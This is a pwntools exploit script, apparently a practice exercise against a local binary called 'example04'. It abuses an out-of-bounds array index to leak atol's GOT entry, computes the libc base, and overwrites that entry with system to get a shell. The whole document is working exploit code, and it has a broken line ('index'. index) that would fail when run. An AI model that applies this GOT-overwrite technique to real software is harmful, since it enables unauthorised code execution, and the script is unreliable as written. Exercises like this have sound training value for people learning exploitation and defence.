from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

p = process('./example04')

gdb.attach(p)

def write(what, where):
    p.sendlineafter('>', str(where))
    p.sendlineafter('>', str(what))


def read(where):
    p.sendlineafter('>', str(where))
    return int(p.recvline())

binary = ELF('./example04')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

write(1, 1,)

atol_got = binary.symbols['got.atol']
numbers = binary.symbols['numbers']
index = str(int((atol_got - numbers) / 8))
print('index'. index)

atol_leak = read(index)
print('atol_leak', hex(atol_leak))

libc_base = atol_leak - libc.symbols['atol']
system_addr = libc_base + libc.symbols['system']

print('system', hex(system_addr))

write(system_addr, index)

p.interactive()
